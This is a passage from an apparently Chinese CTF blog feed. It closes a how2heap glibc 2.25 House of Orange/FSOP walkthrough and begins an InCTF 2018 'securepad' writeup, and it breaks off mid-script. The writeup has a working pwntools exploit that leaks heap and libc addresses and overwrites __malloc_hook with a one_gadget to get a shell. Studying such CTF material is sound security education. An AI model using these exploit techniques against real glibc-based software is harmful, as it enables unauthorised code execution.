class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>ä¼ªé€  <code>_IO_jump_t</code> ä¸­çš„ <code>__overflow</code> ä¸º system å‡½æ•°çš„åœ°å€ï¼Œä»è€Œè¾¾åˆ°æ‰§è¡Œ shell çš„ç›®çš„ã€‚</p><p>å½“å‘ç”Ÿå†…å­˜é”™è¯¯è¿›å…¥ <code>_IO_flush_all_lockp</code> åï¼Œ<code>_IO_list_all</code> ä»ç„¶æŒ‡å‘ unsorted binï¼Œè¿™å¹¶ä¸æ˜¯ä¸€ä¸ªæˆ‘ä»¬èƒ½æ§åˆ¶çš„åœ°å€ã€‚æ‰€ä»¥éœ€è¦é€šè¿‡ <code>fp-&gt;_chain</code> æ¥å°† fp æŒ‡å‘æˆ‘ä»¬èƒ½æ§åˆ¶çš„åœ°æ–¹ã€‚æ‰€ä»¥å°† size å­—æ®µè®¾ç½®ä¸º 0x61ï¼Œå› ä¸ºæ­¤æ—¶ <code>_IO_list_all</code> æ˜¯ <code>&amp;unsorted_bin-0x10</code>ï¼Œåç§» 0x60 ä½ç½®ä¸Šæ˜¯ smallbins[5]ã€‚æ­¤æ—¶ï¼Œå¦‚æœè§¦å‘ä¸€ä¸ªä¸é€‚åˆçš„ small chunk åˆ†é…ï¼Œmalloc å°±ä¼šå°† old top ä» unsorted bin æ”¾å› smallbins[5] ä¸­ã€‚è€Œåœ¨ <code>_IO_FILE</code> ç»“æ„ä¸­ï¼Œåç§» 0x60 æŒ‡å‘ <code>struct _IO_marker *_markers</code>ï¼Œåç§» 0x68 æŒ‡å‘ <code>struct _IO_FILE *_chain</code>ï¼Œè¿™ä¸¤ä¸ªå€¼æ­£å¥½æ˜¯ old top çš„èµ·å§‹åœ°å€ã€‚è¿™æ · fp å°±æŒ‡å‘äº† old topï¼Œè¿™æ˜¯ä¸€ä¸ªæˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶çš„åœ°å€ã€‚</p><p>åœ¨å°† <code>_IO_OVERFLOW</code> ä¿®æ”¹ä¸º system çš„æ—¶å€™ï¼Œæœ‰ä¸€äº›æ¡ä»¶æ£€æŸ¥ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span><br><span class="line">       || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">           &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">#endif</span><br><span class="line">       )</span><br><span class="line">      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)     <span class="comment">// éœ€è¦ä¿®æ”¹ä¸º system å‡½æ•°</span></span><br><span class="line"><span class="comment">// libio/libio.h</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Extra data for wide character streams.  */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_read_ptr;    <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_read_end;    <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_read_base;    <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_write_base;    <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_write_ptr;    <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_write_end;    <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_buf_base;    <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_buf_end;        <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_save_base;    <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_backup_base;    <span class="comment">/* Pointer to first valid character of</span></span><br><span class="line"><span class="comment">                   backup area */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_save_end;    <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">__mbstate_t</span> _IO_state;</span><br><span class="line">  <span class="keyword">__mbstate_t</span> _IO_last_state;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> _<span class="title">codecvt</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">wchar_t</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *_<span class="title">wide_vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬è®¾ç½® <code>fp-&gt;_mode = 0</code>ï¼Œ<code>fp-&gt;_IO_write_base = (char *) 2</code> å’Œ <code>fp-&gt;_IO_write_ptr = (char *) 3</code>ï¼Œä»è€Œç»•è¿‡æ£€æŸ¥ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;_mode = <span class="number">0</span>; <span class="comment">// top+0xc0</span></span><br><span class="line">fp-&gt;_IO_write_base = (<span class="keyword">char</span> *) <span class="number">2</span>; <span class="comment">// top+0x20</span></span><br><span class="line">fp-&gt;_IO_write_ptr = (<span class="keyword">char</span> *) <span class="number">3</span>; <span class="comment">// top+0x28</span></span><br></pre></td></tr></table></figure><p>ç„¶åï¼Œå°±æ˜¯ä¿®æ”¹ <code>_IO_jump_t</code>ï¼Œå°†å…¶æŒ‡å‘ winnerï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">248</span>     <span class="keyword">size_t</span> *jump_table = &amp;top[<span class="number">12</span>]; <span class="comment">// controlled memory</span></span><br><span class="line"><span class="number">249</span>     jump_table[<span class="number">3</span>] = (<span class="keyword">size_t</span>) &amp;winner;</span><br><span class="line"><span class="number">250</span>     *(<span class="keyword">size_t</span> *) ((<span class="keyword">size_t</span>) fp + <span class="keyword">sizeof</span>(_IO_FILE)) = (<span class="keyword">size_t</span>) jump_table; <span class="comment">// top+0xd8</span></span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt;  x/30gx p1-0x10+0x400</span><br><span class="line">0x602400:0x0068732f6e69622f0x0000000000000061</span><br><span class="line">0x602410:0x00007ffff7dd1b580x00007ffff7dd24f0</span><br><span class="line">0x602420:0x00000000000000020x0000000000000003</span><br><span class="line">0x602430:0x00000000000000000x0000000000000000</span><br><span class="line">0x602440:0x00000000000000000x0000000000000000</span><br><span class="line">0x602450:0x00000000000000000x0000000000000000</span><br><span class="line">0x602460:0x00000000000000000x0000000000000000</span><br><span class="line">0x602470:0x00000000000000000x0000000000400777</span><br><span class="line">0x602480:0x00000000000000000x0000000000000000</span><br><span class="line">0x602490:0x00000000000000000x0000000000000000</span><br><span class="line">0x6024a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6024b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6024c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6024d0:0x00000000000000000x0000000000602460</span><br><span class="line">0x6024e0:0x00000000000000000x0000000000000000</span><br><span class="line">PwnLife&gt; p *((struct _IO_FILE_plus *) 0x602400)</span><br><span class="line"><span class="variable">$20</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = 1852400175,</span><br><span class="line">    _IO_read_ptr = 0x61 &lt;error: Cannot access memory at address 0x61&gt;,</span><br><span class="line">    _IO_read_end = 0x7ffff7dd1b58 &lt;main_arena+88&gt; <span class="string">&quot;\020@b&quot;</span>,</span><br><span class="line">    _IO_read_base = 0x7ffff7dd24f0 <span class="string">&quot;&quot;</span>,</span><br><span class="line">    _IO_write_base = 0x2 &lt;error: Cannot access memory at address 0x2&gt;,</span><br><span class="line">    _IO_write_ptr = 0x3 &lt;error: Cannot access memory at address 0x3&gt;,</span><br><span class="line">    _IO_write_end = 0x0,</span><br><span class="line">    _IO_buf_base = 0x0,</span><br><span class="line">    _IO_buf_end = 0x0,</span><br><span class="line">    _IO_save_base = 0x0,</span><br><span class="line">    _IO_backup_base = 0x0,</span><br><span class="line">    _IO_save_end = 0x0,</span><br><span class="line">    _markers = 0x0,</span><br><span class="line">    _chain = 0x0,</span><br><span class="line">    _fileno = 0,</span><br><span class="line">    _flags2 = 0,</span><br><span class="line">    _old_offset = 4196215,</span><br><span class="line">    _cur_column = 0,</span><br><span class="line">    _vtable_offset = 0 <span class="string">&#x27;\000&#x27;</span>,</span><br><span class="line">    _shortbuf = <span class="string">&quot;&quot;</span>,</span><br><span class="line">    _lock = 0x0,</span><br><span class="line">    _offset = 0,</span><br><span class="line">    _codecvt = 0x0,</span><br><span class="line">    _wide_data = 0x0,</span><br><span class="line">    _freeres_list = 0x0,</span><br><span class="line">    _freeres_buf = 0x0,</span><br><span class="line">    __pad5 = 0,</span><br><span class="line">    _mode = 0,</span><br><span class="line">    _unused2 = <span class="string">&#x27;\000&#x27;</span> &lt;repeats 19 <span class="built_in">times</span>&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = 0x602460</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€åéšæ„åˆ†é…ä¸€ä¸ª chunkï¼Œç”±äº <code>size&lt;= 2*SIZE_SZ</code>ï¼Œæ‰€ä»¥ä¼šè§¦å‘ <code>_IO_flush_all_lockp</code> ä¸­çš„ <code>_IO_OVERFLOW</code> å‡½æ•°ï¼Œè·å¾— shellã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;; )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">int</span> iters = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">      &#123;</span><br><span class="line">        bck = victim-&gt;bk;</span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">            || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">          malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                           chunk2mem (victim), av);</span><br><span class="line">        size = chunksize (victim)</span><br></pre></td></tr></table></figure><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>å…³äºhow2heap ä¸­ glibc 2.25çš„å†…å®¹å°±åˆ°è¿™é‡Œç»“æŸäº†ã€‚</p><p>å…³äº glibc 2.26 æ›´å¤šåˆ°æ˜¯ä¸€äº›æ–°ç‰ˆæœ¬ glibc çš„checkçš„bypassâ€¦å°±ä¸å‡†å¤‡å†å†™æˆæ–‡ç« å‘å‡ºæ¥äº†ã€‚</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Summary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> Heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Inctf CTF 2018 secured Writeup</title>
      <link href="2018-inctf-Pwn-securepad-writrup.html"/>
      <url>2018-inctf-Pwn-securepad-writrup.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *ptr; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 i; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  __int64 idx; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter index&quot;</span>);</span><br><span class="line">  idx = (<span class="keyword">signed</span> <span class="keyword">int</span>)get_int(<span class="string">&quot;Enter index&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0L</span>L; i &lt;= <span class="number">9</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( i == idx )</span><br><span class="line">    &#123;</span><br><span class="line">      ptr = *(<span class="keyword">void</span> **)(<span class="number">8</span> * i + table);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    *(_QWORD *)(<span class="number">8</span> * i + table) = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>in delete function, when idx = 10, the pointer is not initialized.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>,<span class="string">&quot;splitw&quot;</span>,<span class="string">&quot;-h&quot;</span>]</span><br><span class="line"></span><br><span class="line">breakpoint = &#123;</span><br><span class="line">    <span class="string">&quot;add&quot;</span>:<span class="number">0x555555555153</span>,</span><br><span class="line">    <span class="string">&quot;edit&quot;</span>:<span class="number">0x555555555169</span>,</span><br><span class="line">    <span class="string">&quot;delete&quot;</span>:<span class="number">0x55555555517F</span>,</span><br><span class="line">    <span class="string">&quot;view&quot;</span>: <span class="number">0x555555555195</span> </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment"># io = process(&#x27;./securepad&#x27;, env = &#123;&#x27;LD_PRELOAD&#x27; : &#x27;./libc.so.6&#x27;&#125;)</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./securepad&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Auth</span>(<span class="params">passwd</span>):</span></span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Enter password&quot;</span>,str(passwd))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span>(<span class="params">passwd,size,data</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt;&gt;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    Auth(passwd)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Enter size&quot;</span>,str(size))</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Enter data:&quot;</span>)</span><br><span class="line">    io.send(str(data))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Remove</span>(<span class="params">passwd,idx</span>):</span></span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&gt;&gt;&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    Auth(str(passwd))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Enter index&quot;</span>,str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">View</span>(<span class="params">passwd,idx</span>):</span></span><br><span class="line">    io.readuntil(<span class="string">&quot;&gt;&gt;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    Auth(passwd)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Enter index&quot;</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Edit</span>(<span class="params">passwd,idx,data</span>):</span></span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&gt;&gt;&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    Auth(passwd)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Enter index&quot;</span>,str(idx))</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br><span class="line">    io.send(str(data))</span><br><span class="line"></span><br><span class="line">Add(<span class="string">&quot;fuck&quot;</span>,<span class="number">0x60</span>,<span class="string">&quot;AAAA&quot;</span>) <span class="comment"># idx = 0</span></span><br><span class="line">Add(<span class="string">&quot;fuck&quot;</span>,<span class="number">0x60</span>,<span class="string">&quot;BBBB&quot;</span>) <span class="comment"># idx = 1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Remove(<span class="string">&quot;fuck&quot;</span>,<span class="number">1</span>)</span><br><span class="line">Remove(<span class="string">&quot;fuck&quot;</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;break *0x%x&#x27; % breakpoint[&#x27;add&#x27;])</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># raw_input(&#x27;wait to debug&#x27;)</span></span><br><span class="line">Add(<span class="string">&quot;fuck&quot;</span>,<span class="number">0x60</span>,<span class="string">&quot;A&quot;</span>) <span class="comment"># idx = 0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">View(<span class="string">&quot;fuck&quot;</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">heap_addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">heap_addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))<span class="number">-0x41</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&quot;leak heap addr:&#123;&#125;&quot;</span>.format(hex(heap_addr)))</span><br><span class="line"></span><br><span class="line">Add(<span class="string">&quot;fuck&quot;</span>,<span class="number">32</span>,<span class="string">&quot;BBBB&quot;</span>) <span class="comment"># idx = 1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Edit(<span class="string">&quot;fuck&quot;</span>,<span class="number">0</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># sleep(1)</span></span><br><span class="line"></span><br><span class="line">Add(<span class="string">&quot;fuck&quot;</span>,<span class="number">0x60</span>, p64(<span class="number">0</span>) * <span class="number">4</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>) * <span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Remove(<span class="string">&#x27;\x00&#x27;</span> * <span class="number">0x3f0</span> + p64(heap_addr + <span class="number">0x20</span>),<span class="number">10</span>) <span class="comment"># why?</span></span><br><span class="line">Edit(<span class="string">&quot;fuck&quot;</span>,<span class="number">0</span>,<span class="string">&#x27;A&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">View(<span class="string">&#x27;fuck&#x27;</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> io.readuntil(<span class="string">&#x27;A&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">3939072</span><span class="number">-88</span></span><br><span class="line">log.success(<span class="string">&quot;leak libc base addr:&#123;&#125;&quot;</span>.format(hex(libc_addr)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">malloc_hook = libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">Remove(<span class="string">&#x27;\x00&#x27;</span> * <span class="number">0x3f0</span> + p64(heap_addr + <span class="number">0x10</span>),<span class="number">10</span>)</span><br><span class="line">Edit(<span class="string">&#x27;fuck&#x27;</span>,<span class="number">0</span>, p64(libc_addr + malloc_hook - <span class="number">0x23</span>))</span><br><span class="line"></span><br><span class="line">gdb.attach(io,<span class="string">&#x27;break *0x%x&#x27;</span> % breakpoint[<span class="string">&#x27;add&#x27;</span>])</span><br><span class="line">raw_input(<span class="string">&#x27;wait to debug&#x27;</span>)</span><br><span class="line">Add(<span class="string">&#x27;fuck&#x27;</span>,<span class="number">0x60</span>,<span class="string">&#x27;hack by swing&#x27;</span>) <span class="comment"># split chunk -&gt; fastbin list ,fastbin is &quot;malloc_hook +23&quot;</span></span><br><span class="line">Add(<span class="string">&#x27;fuck&#x27;</span>,<span class="number">0x60</span>,<span class="string">&#x27;\x00&#x27;</span> * <span class="number">0x13</span> + p64(libc_addr + <span class="number">0xf2519</span>)) <span class="comment"># malloc chunk in fastbins,and edit malloc -&gt; one_gadget</span></span><br><span class="line"></span><br><span class="line">Remove(<span 